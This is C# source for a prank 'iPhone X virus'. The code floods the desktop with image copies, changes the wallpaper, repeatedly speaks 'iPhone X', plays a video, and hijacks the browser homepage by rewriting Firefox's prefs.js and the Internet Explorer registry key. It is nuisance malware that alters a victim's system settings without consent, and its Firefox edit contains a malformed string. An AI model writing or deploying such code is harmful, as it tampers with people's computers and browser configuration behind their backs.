using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Speech.Synthesis;
using System.Speech.Recognition;
using System.IO;
using Microsoft.Win32;

namespace iPhone_X_Virus
{

    class MainCode : BasicClass
    {

        string sourcePath = @"";
        string targetPath = GetDesktopPath();

        public static decimal ammountOfIcons = 42;
        public static decimal ammountOfPhotos = 23;

        public static bool changeWallpaper = true;
        public static bool createIcons = true;
        public static bool playVideo = true;
        public static bool sayIPhoneX = true;
        public static bool startPhotos = false;
        public static bool changeBrowserHomePage = false;

        public static int CurrentBrowserIndex = 0; //0 for Firefox, 1 for IE

        public void IPhoneXify()
        {
            Parallel.Invoke(() => CreateIcons(),
                () => ChangeWallpaper(),
                () => Say(),
                () => StartVideo(),
                () => OpenPhotos());
        }

        private void CreateIcons()
        {
            if (createIcons)
            {
                for (decimal i = 0; i <= ammountOfIcons - 1; i++)
                {
                    if (!File.Exists(targetPath + @"\" + "iPhone X" + i.ToString() + ".jpg")) {
                        string sourceFile = Path.Combine(sourcePath, @"iPhone X.jpg");
                        string destFile = Path.Combine(targetPath, @"iPhone X" + i.ToString() + ".jpg");
                        File.Copy(sourceFile, destFile, false);
                    }
                }
            }
            File.WriteAllText(targetPath + "iPhoneX-ed", "[]n[]n[]n[]");
        }

        private void ChangeWallpaper()
        {
            if (changeWallpaper)
            {
                Wallpaper.Set(new Uri(FilePathToFileUrl("iPhone X.jpg")), Wallpaper.Style.Tile);
            }
        }

        private void Say()
        {
            if (sayIPhoneX)
            {
                SpeechSynthesizer synth = new SpeechSynthesizer();
                synth.SetOutputToDefaultAudioDevice();
                synth.SelectVoiceByHints(VoiceGender.Male, VoiceAge.Adult);
                for (int i = 0; i <= 10; i++)
                {
                    synth.Speak("iPhone X");
                }
                Sleep(1000);
                synth.SelectVoiceByHints(VoiceGender.Male, VoiceAge.Teen);
                synth.Volume = 100;
                synth.Rate = 1;
                synth.SpeakAsync("AIFOUN EX!");
            }
        }

        private void StartVideo() { if (playVideo) { StartProcess(@"Introduceing iPhone X.mp4"); } }

        private void OpenPhotos()
        {
            if (startPhotos)
            {
                for (decimal i = 0; i <= ammountOfPhotos - 1; i++)
                {
                    StartProcess("iPhone X.jpg");
                }
            }
        }

        public void FixIcons()
        {
            for (decimal i = 0; i <= ammountOfIcons - 1; i++)
            {
                if (File.Exists(targetPath + @"\" + "iPhone X" + i.ToString() + ".jpg"))
                {
                    string destFile = Path.Combine(targetPath, @"iPhone X" + i.ToString() + ".jpg");
                    File.Delete(destFile);
                }
            }
        }

        public void SetDefaultWallpaper()
        {
            Wallpaper.Set(new Uri(@"https://static.pexels.com/photos/36764/marguerite-daisy-beautiful-beauty.jpg"), Wallpaper.Style.Center);
        }

        public void ChangeHomepage ()
        {
            if (changeBrowserHomePage)
            {
                if (CurrentBrowserIndex == 0)
                    ChangeHomepageFireFox();
                if (CurrentBrowserIndex == 1)
                    ChangeHomepageIE();
            }
        }

        void ChangeHomepageFireFox ()
        {
            string firefox = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles");
            if (Directory.Exists(firefox))
            {
                FileInfo di = new DirectoryInfo(firefox).GetDirectories()[0].GetFiles("prefs.js")[0];
                StreamReader sr = di.OpenText();
                RichTextBox rb = new RichTextBox();
                rb.Text = sr.ReadToEnd();
                sr.Close();
                string[] s = rb.Lines;
                for (int i = 0; i < rb.Lines.Length; i++)
                {
                    if (rb.Lines[i].StartsWith("user_pref(\"browser.startup.homepage\""))
                    {
                        s[i] = "user_pref(\"browser.startup.homepage\", \"https://www.apple.com/iphone-x);";
                        break;
                    }
                }
                File.Delete(di.FullName);
                File.WriteAllLines(di.FullName, s);
            }
        }

        void ChangeHomepageIE ()
        {
            RegistryKey startPageKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\Main", true);
            startPageKey.SetValue("Start Page", "https://www.apple.com/iphone-x");
            startPageKey.Close();
        }
    }
}
